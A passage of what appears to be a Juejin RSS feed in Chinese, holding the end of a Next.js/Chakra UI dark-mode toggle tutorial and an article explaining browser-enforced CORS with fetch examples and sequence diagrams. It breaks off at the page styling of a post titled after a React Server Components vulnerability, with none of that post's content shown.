  <span class="hljs-keyword">const</span> { toggleColorMode } = <span class="hljs-title function_">useColorMode</span>()
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ClientOnly</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Skeleton</span> <span class="hljs-attr">boxSize</span>=<span class="hljs-string">"9"</span> /&gt;</span>}&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">IconButton</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{toggleColorMode}</span> // <span class="hljs-attr">点击时切换主题</span>
        <span class="hljs-attr">variant</span>=<span class="hljs-string">"ghost"</span>           // <span class="hljs-attr">使用透明背景的按钮样式</span>
        <span class="hljs-attr">aria-label</span>=<span class="hljs-string">"切换颜色模式"</span>
        <span class="hljs-attr">size</span>=<span class="hljs-string">"sm"</span>
        <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span>
        {<span class="hljs-attr">...props</span>}
        <span class="hljs-attr">css</span>=<span class="hljs-string">{{</span>
          <span class="hljs-attr">_icon:</span> {
            <span class="hljs-attr">width:</span> "<span class="hljs-attr">5</span>",
            <span class="hljs-attr">height:</span> "<span class="hljs-attr">5</span>",
          },
        }}
      &gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ColorModeIcon</span> /&gt;</span> // 显示主题图标
      <span class="hljs-tag">&lt;/<span class="hljs-name">IconButton</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ClientOnly</span>&gt;</span></span>
  )
})

<span class="hljs-comment">// 根据主题返回不同值的Hook</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> useColorModeValue&lt;T&gt;(<span class="hljs-attr">light</span>: T, <span class="hljs-attr">dark</span>: T) {
  <span class="hljs-keyword">const</span> { colorMode } = <span class="hljs-title function_">useColorMode</span>()
  <span class="hljs-keyword">return</span> colorMode === <span class="hljs-string">"dark"</span> ? dark : light
}
</code></pre>
<h4 data-id="heading-9">代码解析</h4>
<ol>
<li>
<p><strong>"use client"</strong>：标记这是一个客户端组件</p>
</li>
<li>
<p><strong>useColorMode Hook</strong>：</p>
<ul>
<li>使用next-themes的useTheme Hook获取主题状态</li>
<li>实现了获取当前主题、设置主题和切换主题的功能</li>
</ul>
</li>
<li>
<p><strong>ColorModeIcon组件</strong>：</p>
<ul>
<li>根据当前主题显示太阳或月亮图标</li>
<li>使用了react-icons库中的LuSun和LuMoon图标</li>
</ul>
</li>
<li>
<p><strong>ColorModeButton组件</strong>：</p>
<ul>
<li>使用Chakra UI的IconButton组件</li>
<li>点击时触发toggleColorMode函数</li>
<li>包含加载状态的骨架屏</li>
</ul>
</li>
<li>
<p><strong>useColorModeValue Hook</strong>：</p>
<ul>
<li>一个便捷的Hook，根据当前主题返回不同的值</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">📄 第五步：在页面中使用主题切换</h3>
<p>现在我们在首页<code>src/pages/index.tsx</code>中使用主题切换按钮：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// src/pages/index.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ColorModeButton</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/components/color-mode"</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Box</span>, <span class="hljs-title class_">Text</span>, <span class="hljs-title class_">VStack</span>, <span class="hljs-title class_">Heading</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@chakra-ui/react"</span>
<span class="hljs-keyword">import</span> { useColorModeValue } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/components/color-mode"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 根据主题返回不同的文本颜色</span>
  <span class="hljs-keyword">const</span> textColor = <span class="hljs-title function_">useColorModeValue</span>(<span class="hljs-string">"gray.800"</span>, <span class="hljs-string">"gray.200"</span>)
  <span class="hljs-comment">// 根据主题返回不同的背景颜色</span>
  <span class="hljs-keyword">const</span> bgColor = <span class="hljs-title function_">useColorModeValue</span>(<span class="hljs-string">"white"</span>, <span class="hljs-string">"gray.900"</span>)
  <span class="hljs-comment">// 根据主题返回不同的强调色</span>
  <span class="hljs-keyword">const</span> accentColor = <span class="hljs-title function_">useColorModeValue</span>(<span class="hljs-string">"blue.600"</span>, <span class="hljs-string">"blue.400"</span>)
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Box</span> 
      <span class="hljs-attr">minHeight</span>=<span class="hljs-string">"100vh"</span> 
      <span class="hljs-attr">padding</span>=<span class="hljs-string">"4rem"</span> 
      <span class="hljs-attr">backgroundColor</span>=<span class="hljs-string">{bgColor}</span>
      <span class="hljs-attr">color</span>=<span class="hljs-string">{textColor}</span>
    &gt;</span>
      {/* 主题切换按钮 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Box</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"absolute"</span> <span class="hljs-attr">top</span>=<span class="hljs-string">"4"</span> <span class="hljs-attr">right</span>=<span class="hljs-string">"4"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ColorModeButton</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Box</span>&gt;</span>
      
      {/* 页面内容 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">VStack</span> <span class="hljs-attr">spacing</span>=<span class="hljs-string">"4"</span> <span class="hljs-attr">alignItems</span>=<span class="hljs-string">"center"</span> <span class="hljs-attr">justifyContent</span>=<span class="hljs-string">"center"</span> <span class="hljs-attr">minHeight</span>=<span class="hljs-string">"100vh"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Heading</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"h1"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"2xl"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">{accentColor}</span>&gt;</span>
          Next.js 主题切换示例
        <span class="hljs-tag">&lt;/<span class="hljs-name">Heading</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">fontSize</span>=<span class="hljs-string">"xl"</span>&gt;</span>
          当前使用 {useColorModeValue("浅色", "深色")} 模式
        <span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Text</span>&gt;</span>
          点击右上角的图标切换主题
        <span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">VStack</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Box</span>&gt;</span></span>
  )
}
</code></pre>
<p>这里我们：</p>
<ul>
<li>使用<code>ColorModeButton</code>组件添加主题切换按钮</li>
<li>使用<code>useColorModeValue</code> Hook根据主题返回不同的颜色值</li>
<li>创建了一个简单的页面布局来展示主题效果</li>
</ul>
<h3 data-id="heading-11">🧪 第六步：测试和优化</h3>
<h4 data-id="heading-12">运行开发服务器</h4>
<pre><code class="hljs language-bash" lang="bash">npm run dev
</code></pre>
<p>在浏览器中打开<code>http://localhost:3000</code>，你应该能看到：</p>
<ul>
<li>一个带有主题切换按钮的页面</li>
<li>点击按钮可以在浅色和深色模式之间切换</li>
<li>主题状态会自动保存到localStorage</li>
</ul>
<h4 data-id="heading-13">优化建议</h4>
<ol>
<li><strong>添加过渡效果</strong>：可以为主题切换添加平滑的过渡动画</li>
<li><strong>自定义主题</strong>：可以扩展Chakra UI的默认主题</li>
<li><strong>添加更多主题</strong>：除了浅色和深色模式，还可以添加更多主题选项</li>
</ol>
<h3 data-id="heading-14">💡 技术要点解析</h3>
<h4 data-id="heading-15">next-themes的工作原理</h4>
<p>next-themes通过以下方式实现主题管理：</p>
<ul>
<li>在客户端：使用localStorage存储主题偏好</li>
<li>在服务器端：检测系统主题并注入相应的CSS类</li>
<li>通过React Context API在组件树中共享主题状态</li>
</ul>
<h4 data-id="heading-16">Chakra UI与主题的集成</h4>
<p>Chakra UI的主题系统与next-themes完美兼容：</p>
<ul>
<li>提供了丰富的主题变量</li>
<li>支持自定义主题</li>
<li>组件会自动响应主题变化</li>
</ul>
<h4 data-id="heading-17">客户端组件与服务端渲染</h4>
<p>由于主题切换是客户端功能，我们需要使用：</p>
<ul>
<li><code>"use client"</code>指令标记客户端组件</li>
<li><code>ClientOnly</code>组件确保在客户端渲染</li>
<li>骨架屏处理加载状态</li>
</ul>
<h3 data-id="heading-18">🏁 总结</h3>
<p>通过本文的教程，我们成功实现了一个优雅的Next.js主题切换功能：</p>
<ol>
<li>初始化了Next.js Page Router项目</li>
<li>集成了Chakra UI和next-themes</li>
<li>实现了完整的主题切换组件</li>
<li>在页面中使用主题功能</li>
</ol>
<p>这个实现具有以下特点：</p>
<ul>
<li>✅ 支持浅色/深色模式切换</li>
<li>✅ 主题状态持久化</li>
<li>✅ 响应系统主题偏好</li>
<li>✅ 优雅的图标显示</li>
<li>✅ 良好的用户体验</li>
</ul>
<p>希望本文对你有所帮助，让你能够轻松地为自己的Next.js应用添加主题切换功能！</p>
<h3 data-id="heading-19">📁 项目地址</h3>
<p>本文的完整代码可以在GitHub上找到：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FZhaoDongnan%2Fnext-page-router-chakra-theme-switch" target="_blank" title="https://github.com/ZhaoDongnan/next-page-router-chakra-theme-switch" ref="nofollow noopener noreferrer">github.com/ZhaoDongnan…</a></p>
<hr/>
<p>如果觉得本文有用，欢迎点赞、收藏、评论和分享！😊</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[跨域是服务器拒绝请求还是浏览器去拒绝的请求？]]></title>    <link>https://juejin.cn/post/7579567346391121946</link>    <guid>https://juejin.cn/post/7579567346391121946</guid>    <pubDate>2025-12-04T04:48:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579567346391121946" data-draft-id="7579551362154987529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="跨域是服务器拒绝请求还是浏览器去拒绝的请求？"/> <meta itemprop="keywords" content="浏览器,前端"/> <meta itemprop="datePublished" content="2025-12-04T04:48:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新晨437"/> <meta itemprop="url" content="https://juejin.cn/user/3957868231143133"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            跨域是服务器拒绝请求还是浏览器去拒绝的请求？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3957868231143133/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新晨437
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T04:48:12.000Z" title="Thu Dec 04 2025 04:48:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这是一个非常好的问题！简单来说：<strong>跨域限制是浏览器主动实施的，服务器可以参与控制这个过程，但最终是浏览器决定是否拒绝请求。</strong></p>
<p>让我详细解释一下：</p>
<h2 data-id="heading-0">1. <strong>浏览器是执行者</strong></h2>
<ul>
<li>跨域请求（CORS - Cross-Origin Resource Sharing）限制是浏览器的<strong>安全策略</strong></li>
<li>当你从一个源（如 <code>https://example.com</code>）的网页中向另一个源（如 <code>https://api.other.com</code>）发送AJAX/fetch请求时，浏览器会自动：
<ol>
<li>检查请求是否是“简单请求”还是“非简单请求”</li>
<li>对于非简单请求，会先发送一个<strong>预检请求</strong>（OPTIONS请求）</li>
<li>根据服务器返回的CORS头部决定是否允许实际请求</li>
</ol>
</li>
</ul>
<h2 data-id="heading-1">2. <strong>服务器的角色</strong></h2>
<p>服务器通过响应头告诉浏览器：</p>
<ul>
<li><code>Access-Control-Allow-Origin</code>：允许哪些源访问</li>
<li><code>Access-Control-Allow-Methods</code>：允许哪些HTTP方法</li>
<li><code>Access-Control-Allow-Headers</code>：允许哪些请求头</li>
<li><code>Access-Control-Allow-Credentials</code>：是否允许发送凭据（如cookies）</li>
</ul>
<h2 data-id="heading-2">3. <strong>拒绝请求的场景</strong></h2>
<h3 data-id="heading-3">情况A：浏览器直接拒绝（没有CORS配置时）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 假设当前页面是 https://example.com</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.other.com/data'</span>)  <span class="hljs-comment">// 不同域</span>
  .<span class="hljs-title function_">then</span>(...)
<span class="hljs-comment">// 浏览器会直接报错：Cross-Origin Request Blocked</span>
<span class="hljs-comment">// 请求甚至没有到达 api.other.com</span>
</code></pre>
<h3 data-id="heading-4">情况B：服务器拒绝，浏览器执行拒绝</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 服务器返回的响应头：</span>
<span class="hljs-comment">// Access-Control-Allow-Origin: https://allowed.com</span>
<span class="hljs-comment">// 而当前源是 https://example.com</span>
<span class="hljs-comment">// 浏览器检查后发现不被允许，拒绝访问响应数据</span>
</code></pre>
<h2 data-id="heading-5">4. <strong>例外情况</strong></h2>
<ul>
<li><strong>非浏览器环境</strong>：Node.js、Postman、curl等工具没有跨域限制</li>
<li><strong>服务端到服务端</strong>：服务器之间的请求不受CORS限制</li>
<li><strong>某些HTML标签</strong>：<code>&lt;img&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;link&gt;</code>等可以跨域加载资源</li>
</ul>
<h2 data-id="heading-6">关键要点</h2>
<ul>
<li><strong>浏览器主动实施</strong>：跨域是浏览器的安全策略</li>
<li><strong>服务器被动响应</strong>：服务器通过响应头告诉浏览器自己的跨域策略</li>
<li><strong>协作机制</strong>：浏览器检查服务器的CORS头部后决定是否允许请求继续</li>
</ul>
<p>这就是为什么在开发时，前端遇到跨域问题需要后端配置CORS头部，或者在开发环境中使用代理服务器来解决跨域问题。</p>
<h2 data-id="heading-7">5. 时序图说明</h2>
<p>这是一个跨域请求的<strong>时序图</strong>，展示浏览器、前端代码和服务器之间的交互流程：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant F as 前端代码&lt;br&gt;(https://example.com)
    participant B as 浏览器
    participant S as 服务器&lt;br&gt;(https://api.other.com)

    Note over F,S: 1. 简单请求（无预检）
    F-&gt;&gt;B: 发送fetch()请求&lt;br&gt;GET /api/data
    B-&gt;&gt;S: 直接发送请求
    S--&gt;&gt;B: 返回响应 + CORS头&lt;br&gt;(Access-Control-Allow-Origin)
    B-&gt;&gt;B: 检查CORS头&lt;br&gt;当前源是否在允许列表中？
    alt CORS允许
        B--&gt;&gt;F: 返回响应数据
    else CORS拒绝
        B--&gt;&gt;F: 抛出跨域错误&lt;br&gt;响应被浏览器屏蔽
    end

    Note over F,S: 2. 非简单请求（有预检）
    F-&gt;&gt;B: 发送fetch()请求&lt;br&gt;PUT /api/data + 自定义头
    B-&gt;&gt;S: 发送OPTIONS预检请求
    S--&gt;&gt;B: 返回预检响应&lt;br&gt;包含CORS策略头
    B-&gt;&gt;B: 检查预检响应
    alt 预检通过
        B-&gt;&gt;S: 发送实际PUT请求
        S--&gt;&gt;B: 返回实际响应 + CORS头
        B--&gt;&gt;F: 返回数据
    else 预检拒绝
        B--&gt;&gt;F: 直接报错&lt;br&gt;实际请求不会发送
    end
</code></pre>
<h2 data-id="heading-8">时序流程说明：</h2>
<h3 data-id="heading-9"><strong>第一阶段：前端代码发起请求</strong></h3>
<ol>
<li>前端JavaScript调用<code>fetch()</code>或<code>XMLHttpRequest</code></li>
<li>浏览器接收到请求指令</li>
</ol>
<h3 data-id="heading-10"><strong>第二阶段：浏览器判断请求类型</strong></h3>
<pre><code class="hljs language-bash" lang="bash">简单请求条件（同时满足）：
- 方法：GET、POST、HEAD
- 头部：仅限安全头部（Accept、Accept-Language等）
- Content-Type：text/plain、application/x-www-form-urlencoded、multipart/form-data
</code></pre>
<h3 data-id="heading-11"><strong>第三阶段：分叉处理</strong></h3>
<h4 data-id="heading-12"><strong>A. 简单请求路径：</strong></h4>
<ul>
<li>浏览器直接发送请求到服务器</li>
<li>服务器返回响应和CORS头部</li>
<li>浏览器检查CORS头部，决定是否将响应给前端代码</li>
</ul>
<h4 data-id="heading-13"><strong>B. 非简单请求路径（需要预检）：</strong></h4>
<pre><code class="hljs language-diff" lang="diff">触发预检的情况：
<span class="hljs-deletion">- 方法：PUT、DELETE、PATCH等</span>
<span class="hljs-deletion">- 自定义头部：X-Custom-Header等</span>
<span class="hljs-deletion">- Content-Type：application/json等</span>
</code></pre>
<ol>
<li>浏览器先发送<code>OPTIONS</code>预检请求</li>
<li>服务器返回CORS策略</li>
<li><strong>关键决策点</strong>：浏览器检查策略
<ul>
<li>通过 → 发送实际请求</li>
<li>拒绝 → 直接报错，不发送实际请求</li>
</ul>
</li>
</ol>
<h3 data-id="heading-14"><strong>第四阶段：最终结果</strong></h3>
<ul>
<li><strong>成功</strong>：数据传递给前端代码的<code>then()</code>或<code>onload</code></li>
<li><strong>失败</strong>：触发<code>catch()</code>或<code>onerror</code>，控制台显示跨域错误</li>
</ul>
<h2 data-id="heading-15">关键决策点时序：</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[前端发起请求] --&gt; B{浏览器判断&lt;br&gt;简单请求?}
    B --&gt;|是| C[直接发送请求]
    B --&gt;|否| D[发送OPTIONS预检]
    D --&gt; E{服务器返回&lt;br&gt;CORS策略}
    E --&gt;|允许| F[发送实际请求]
    E --&gt;|拒绝| G[直接报错]
    C --&gt; H[服务器返回响应]
    F --&gt; H
    H --&gt; I{浏览器检查&lt;br&gt;CORS头}
    I --&gt;|源允许| J[传递数据给前端]
    I --&gt;|源拒绝| K[屏蔽响应并报错]
</code></pre>
<h2 data-id="heading-16">实际报错示例时间点：</h2>
<ul>
<li><strong>预检阶段失败</strong>：服务器未返回正确的OPTIONS响应</li>
<li><strong>响应阶段失败</strong>：<code>Access-Control-Allow-Origin</code>不匹配当前源</li>
<li><strong>凭证请求失败</strong>：设置了<code>credentials: 'include'</code>但服务器未返回<code>Access-Control-Allow-Credentials: true</code></li>
</ul>
<p>这个时序图清晰地展示了跨域限制是<strong>浏览器主动实施</strong>的过程，服务器只是被动地响应浏览器的询问（通过CORS头部）。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Server Components 的致命漏洞CVE-2025-55182， CVSS 10.0 的未授权远程代码执行]]></title>    <link>https://juejin.cn/post/7579589262623293459</link>    <guid>https://juejin.cn/post/7579589262623293459</guid>    <pubDate>2025-12-04T05:26:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579589262623293459" data-draft-id="7579553111473029174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Server Components 的致命漏洞CVE-2025-55182， CVSS 10.0 的未授权远程代码执行"/> <meta itemprop="keywords" content="前端,安全"/> <meta itemprop="datePublished" content="2025-12-04T05:26:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="timeweaver"/> <meta itemprop="url" content="https://juejin.cn/user/1341831509187863"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Server Components 的致命漏洞CVE-2025-55182， CVSS 10.0 的未授权远程代码执行
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1341831509187863/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    timeweaver
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T05:26:23.000Z" title="Thu Dec 04 2025 05:26:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin:30px 0 10px;color:#cca152;position:relative;padding-left:50px;border-bottom:2px solid rgba(209,163,78,.6);padding-bottom:0}.markdown-body h1{font-size:30px}.markdown-body 